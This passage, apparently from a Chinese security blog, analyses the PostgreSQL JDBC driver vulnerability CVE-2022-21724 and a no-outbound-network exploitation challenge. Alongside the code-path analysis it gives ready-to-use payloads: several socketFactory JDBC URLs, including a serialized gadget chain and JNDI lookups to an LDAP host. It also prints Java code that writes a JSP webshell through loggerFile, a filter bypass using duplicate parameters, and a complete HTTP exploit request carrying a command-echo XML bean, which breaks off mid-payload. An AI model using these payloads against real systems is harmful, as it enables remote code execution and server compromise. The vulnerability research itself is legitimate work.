<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719038204-51b7a651-6c10-472a-be4d-f76a4238a178.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719038204-51b7a651-6c10-472a-be4d-f76a4238a178.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟到<code>ClassPathXmlApplicationContext</code>的构造函数中，首先将xml文件的远程url地址赋值<code>configLocations</code>，然后调用<code>refresh</code>方法，我们跟进查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719306701-2c2860f8-bdd6-41e5-a2ff-84ee14fc7f00.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719306701-2c2860f8-bdd6-41e5-a2ff-84ee14fc7f00.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里的<code>obtainFreshBeanFactory</code>方法，是从远程加载我们的xml文件内容的，跟进看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719417570-eb338480-8875-4bb0-84b2-cade058a50f3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752719417570-eb338480-8875-4bb0-84b2-cade058a50f3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟入<code>refreshBeanFactory</code>，调用了<code>loadBeanDefinitions</code>方法，继续跟进查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720025961-1789c579-f995-4f27-a73f-4fc2590da661.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720025961-1789c579-f995-4f27-a73f-4fc2590da661.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后在<code>reader#loadBeanDefinitions</code>中读取了我们的xml文件内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720116534-a9be4289-d1f5-4a1c-a23a-02f574fb9554.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752720116534-a9be4289-d1f5-4a1c-a23a-02f574fb9554.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>返回<code>refresh</code>方法中，漏洞的触发在<code>finishBeanFactoryInitialization</code>方法内，这里对我们传入的poc.xml文件进行解析，最后SPEL表达式的执行，然后触发漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752721327115-2dc5d9fd-74cc-4520-b302-33bbffd33d5e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752721327115-2dc5d9fd-74cc-4520-b302-33bbffd33d5e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>漏洞触发情况如下</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1752721424465-20e7cd1a-28f5-45cc-a1d3-900e0a1ed300.png?x-oss-process=image/format,webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1752721424465-20e7cd1a-28f5-45cc-a1d3-900e0a1ed300.png?x-oss-process=image/format,webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="f8A4x">其他利用方式</h4>

<p>其他的利用方式这里就不分析了，只给出相关Poc</p>
<h5 id="mczVG">JLabel</h5>

<p>CS RCE 的套娃，需要依赖 batik-swing，同时对 JDK 环境及版本也有要求。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=javax.swing.JLabel&amp;socketFactoryArg=&lt;html&gt;&lt;object classid=&quot;org.apache.batik.swing.JSVGCanvas&quot;&gt;&lt;param name=&quot;URI&quot; value=&quot;http://localhost:8080/1.xml&quot;&gt;&lt;/object&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="A8bcB">MiniAdmin</h5>
Mysql的套娃，需要有mysql-connector-java（<font style="color:rgb(0, 0, 0);">这个类在高版本才有</font>）

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=com.mysql.cj.jdbc.admin.MiniAdmin&amp;socketFactoryArg=jdbc:mysql://127.0.0.1:3306/test?...</span><br></pre></td></tr></table></figure>

<h5 id="tVBEe">IniEnvironment</h5>

<p>在 ActiveMQ 不出网利用中出现的类，可以配合 BCEL 加载以及反序列化，需要依赖 activemq-shiro 以及对应依赖</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=org.apache.activemq.shiro.env.IniEnvironment&amp;socketFactoryArg=%5Bmain%5D%0Abs%20%3D%20org.apache.activemq.util.ByteSequence%0Amessage%20%3D%20org.apache.activemq.command.ActiveMQObjectMessage%0Abs.data%20%3D%20rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA%2Fb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y%2B%2FSZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB%2BAARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAAAU3K%2Frq%2BAAAAMQAWAQA0b3JnL2FwYWNoZS93aWNrZXQvYmF0aWsvYnJpZGdlL1NWR0Jyb2tlbkxpbmtQcm92aWRlcgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAGgACAAEAAAAOKrcACbgADxIRtgAVV7EAAAAAAAB1cQB%2BABAAAAEayv66vgAAADQAEQEANW9yZy9hcGFjaGUvY29tbW9ucy9qYW0vcHJvdmlkZXIvSmFtU2VydmljZUZhY3RvcnlJbXBsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABpKYW1TZXJ2aWNlRmFjdG9yeUltcGwuamF2YQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADAANCgAEAA4BAARDb2RlACEAAgAEAAAAAQAaAAcACAABAAsAAAACAAkAAQABAAwADQABABAAAAARAAEAAQAAAAUqtwAPsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHEAfgANeA%3D%3D%0Abs.length%20%3D%201628%0Abs.offset%20%3D%200%0Amessage.content%20%3D%20%24bs%0Amessage.trustAllPackages%20%3D%20true%0Amessage.object.x%20%3D%20x</span><br></pre></td></tr></table></figure>

<h5 id="ihRex">HikariConfig</h5>
利用 Properties 方式，走 HikariConfig 触发 JNDI，需要依赖 HikariCP

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:///?socketFactory=com.zaxxer.hikari.HikariConfi&amp;metricRegistry=ldap://127.0.0.1:1389/exp</span><br></pre></td></tr></table></figure>

<h3 id="ARtJM">任意文件写入</h3>
<h4 id="ldLXH">影响版本</h4>

<p>该漏洞影响版本如下</p>
<ul>
<li><font style="color:rgb(36, 41, 47);">42.3.x &lt; 42.3.3</font></li>
<li><font style="color:rgb(36, 41, 47);">42.1.x</font></li>
</ul>
<h4 id="JrAG1">漏洞环境</h4>
漏洞触发如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cve_2022_21724_filewrite</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String loggerLevel=<span class="string">&quot;DEBUG&quot;</span>;</span><br><span class="line">        String loggerFile=<span class="string">&quot;hack.jsp&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;&lt;%25test;%25&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql:///?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="string">&quot;&amp;&quot;</span>+shellContent;</span><br><span class="line">        System.out.println(dbUrl);</span><br><span class="line">        DriverManager.getConnection(dbUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xdkTh">漏洞分析</h4>

<p>看到<code>postgresql</code>驱动的<code>connect</code>方法中，在<code>makeConnection</code>方法前，有<code>setupLoggerFromProperties</code>方法，是用来配置Logger信息的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723064881-30432783-88a2-4e3a-8ac0-0aca3b0cb354.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723064881-30432783-88a2-4e3a-8ac0-0aca3b0cb354.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟到<code>setupLoggerFromProperties</code>中，首先判断LogLevel为DEBUG，然后获取到我们的文件名为<code>hack.jsp</code>（这里文件中并没有对filename进行过滤，我们这里可以通过<code>../</code>进行目录穿越，上传到任何地方）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723231734-d2a51162-7923-442a-878f-98435a4af9fa.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723231734-d2a51162-7923-442a-878f-98435a4af9fa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后面日志操作进行初始化，在文件夹下创建一个<code>hack.jsp</code>文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723419702-b8486237-9db8-45c3-a2a3-c1aaa48854ed.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723419702-b8486237-9db8-45c3-a2a3-c1aaa48854ed.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跳出<code>setupLoggerFromProperties</code>方法，下一步就进行了日志的记录，将我们的url记录到<code>hack.jsp</code>中，在java环境下，jsp文件中<code>&lt;% %&gt;</code>将被解析，也可以达到RCE的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723581540-210c0973-e416-4eca-9ecf-14754e7459eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723581540-210c0973-e416-4eca-9ecf-14754e7459eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>hack.jsp</code>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723759099-880ec78e-280d-4513-9e10-4690d5d38f01.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752723759099-880ec78e-280d-4513-9e10-4690d5d38f01.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="PvIWE">其他利用方式</h4>
<h5 id="NXNu0">log4j2</h5>
在导入log4j版本为存在漏洞版本时，就可能配合log4j2实现JNDI注入

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:///$&#123;jndi:ldap://127.0.0.1:1389/exp&#125;?loggerLevel=TRACE&amp;loggerFile=log.log</span><br></pre></td></tr></table></figure>

<h5 id="DQF19">jar/war包等zip包</h5>

<p>此种利用方式就是生成一个纯 ASCII 范围内的 ZIP，并结合环境进行 Jar 包加载、War 包部署等姿势</p>
<h3 id="Y6juf">漏洞修复</h3>
漏洞修复，是在各个接口实例化时，加上了期望类的判断

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752807025171-eabc64e9-b691-452f-b6bb-dfa90ec0261e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752807025171-eabc64e9-b691-452f-b6bb-dfa90ec0261e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="QUkZI">PostgreSQL不出网利用</h2>
<h3 id="XjfxO">漏洞分析</h3>

<p>这里直接拿p神的挑战，来进行分析</p>
<p>在我们到Controller之前，首先要经过一个Filter，要求我们的参数中不能同时包含<code>jdbc:postgresql</code>和<code>socketFactory</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752762574412-9a660e34-1f90-4205-8140-6ead46619902.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752762574412-9a660e34-1f90-4205-8140-6ead46619902.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里我们利用<code>getParameter</code>方法和在controller来get参数解析差异进行绕过，<code>getParameter</code>方法在有多个url参数时，只获取第一个url</p>
<p>传入url如下</p>
<p>可以看到在Filter中<code>request.getParameter(url)</code>方法中，接收到的只有<code>jdbc:postgresql://127.0.0.1:5432/test/?a=</code>，这里的url并不同时包含<code>jdbc:postgresql</code>和<code>socketFactory</code>，因此我们可以走到Controller中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=jdbc:postgresql://127.0.0.1:5432/test/?a=&amp;url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=1 </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763086097-c6e7ab4c-4897-4751-a479-a04e7be07a4f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763086097-c6e7ab4c-4897-4751-a479-a04e7be07a4f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>走到Controller中，我们可以看到，接受的参数为<code>jdbc:postgresql://127.0.0.1:5432/test/?a=,&amp;socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=1</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763263976-ea3c636c-a5c8-4106-a6f2-648d7120cd50.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763263976-ea3c636c-a5c8-4106-a6f2-648d7120cd50.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里通过一个<code>,</code>替换了<code>&amp;url</code>，以逗号为分隔符，将两个url参数拼接到一起，这样就可以成功绕过Filter的阻碍</p>
<p>我们继续看到Controller中，这里这段代码，直接禁止程序进行网络访问操作（之前不知道，现在才理解了为什么会有那么多不出网情况下的利用），因此我们无法通过http请求来获取Poc里面的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">ForbiddenNetworkAccessSecurityManager</span>());</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763719916-dfcbc403-0a67-49ce-b8f8-3bf8e5d3d261.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752763719916-dfcbc403-0a67-49ce-b8f8-3bf8e5d3d261.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来就要解析Url里面的环境变量了</p>
<p>我们使用<code>$&#123;catalina.home&#125;</code>作为<code>socketFactoryArg</code>的值</p>
<p>跟到<code>ClassPathXmlApplicationContext</code>的构造方法内，走入<code>setConfigLoacations</code>方法中，里面有个<code>resolvePath</code>，继续跟进</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768356045-d359de20-270d-4f15-846d-2167fab6f555.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768356045-d359de20-270d-4f15-846d-2167fab6f555.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>resolvePath</code>后继续跟入<code>getEnvironment</code>方法内，这里的<code>createEnvronment</code>创建了一个<code>StandardEnvironment</code>对象，这个对象是spring中用来处理环境变量的类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768495825-c674ae7b-e851-41de-ba72-24b0df61ce33.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768495825-c674ae7b-e851-41de-ba72-24b0df61ce33.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>步出，准备跟进<code>resolveRequiredPlaceholders</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768596070-522bf67d-bdfe-4b68-a767-14ae4b830b28.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768596070-522bf67d-bdfe-4b68-a767-14ae4b830b28.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续跟进<code>doResolcePlaceholders</code>方法，应该是通过构造的<code>strictHelper</code>对text的内容进行解析</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768664431-c9c4f69e-0d82-4119-8b47-7882077a967b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768664431-c9c4f69e-0d82-4119-8b47-7882077a967b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>一步一步跟到<code>parseStringValue</code>中，这里将<code>$&#123;&#125;</code>中的内容截取出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768890828-5fb8ed53-4d96-470c-892f-4aa004f88995.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752768890828-5fb8ed53-4d96-470c-892f-4aa004f88995.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后将<code>catalina.home</code>的值解析成了我们tomcat临时文件的路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752769005198-ec3c7766-57d3-4d44-bdd3-b76341b62cb9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752769005198-ec3c7766-57d3-4d44-bdd3-b76341b62cb9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>当我们以文件上传的格式传入数据时，就会创建这个临时文件，内容是我们所上传的东西，在调用完成后这个文件就会消失</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752804841499-dbae363f-de51-4f74-a2e1-10c3ea5f2b8f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752804841499-dbae363f-de51-4f74-a2e1-10c3ea5f2b8f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>临时文件的名称是随机的，但是我们可以通过通配符来匹配临时文件从而进行命令执行，这里我们将<code>socketFactoryArg</code>的值替换为<code>file://$&#123;catalina.home&#125;/**/*.tmp</code>进行分析</p>
<p>在refresh方法中，进行加载文件时，会走到getResources方法中，调用栈如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getResources:<span class="number">279</span>, PathMatchingResourcePatternResolver (org.springframework.core.io.support)</span><br><span class="line">getResources:<span class="number">1423</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">231</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">203</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">265</span>, AbstractBeanDefinitionReader (org.springframework.beans.factory.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">128</span>, AbstractXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">loadBeanDefinitions:<span class="number">94</span>, AbstractXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">refreshBeanFactory:<span class="number">130</span>, AbstractRefreshableApplicationContext (org.springframework.context.support)</span><br><span class="line">obtainFreshBeanFactory:<span class="number">671</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:<span class="number">553</span>, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:<span class="number">144</span>, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:<span class="number">85</span>, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br></pre></td></tr></table></figure>

<p>经过一些判断后，最终会走到<code>isPattern</code>方法处</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803786059-4c245832-5a15-48b2-b736-d1c5bc4a1586.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803786059-4c245832-5a15-48b2-b736-d1c5bc4a1586.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们跟进查看一下该方法，可看到该方法里面的代码逻辑是判断：路径字符中是否有用通配符，从而决定是否要做模式匹配搜索</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803847284-7c42f944-d291-4ecc-92cb-2c0c9585840d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752803847284-7c42f944-d291-4ecc-92cb-2c0c9585840d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>走入<code>findPathMatchingResources</code>方法中，跟进<code>doFindPathMatchingFileResources</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805221675-11c63fc2-459b-46c5-b9fa-7cf383298346.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805221675-11c63fc2-459b-46c5-b9fa-7cf383298346.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>doFindPathMatchingFileResources</code>方法中，就可以找到我们的临时文件，最后通过file协议读取内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805413860-11b337eb-848e-489d-a400-7084bd98a886.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805413860-11b337eb-848e-489d-a400-7084bd98a886.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>通过JavaChains构建一个回显马xml，然后构造数据包进行请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805581279-0ff4c97a-7c4d-40e8-b895-ee2727b6d2b6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805581279-0ff4c97a-7c4d-40e8-b895-ee2727b6d2b6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">构造数据包如下，一个数据包就可以完成不出网的利用</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jdbc?url=jdbc:postgresql:///test/?a=&amp;url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=file://%24%7bcatalina.home%7d/**/*.tmp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.111.1:8080</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Authorization</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryIg9FMRJD9ScjO8dH</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>135</span><br><span class="line"></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH</span></span><br><span class="line"><span class="language-bash">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="language-bash">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="language-bash">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="language-bash">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;decoder&quot;</span> class=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;staticMethod&quot;</span> value=<span class="string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;arguments&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">            &lt;list&gt;</span></span><br><span class="line"><span class="language-bash">                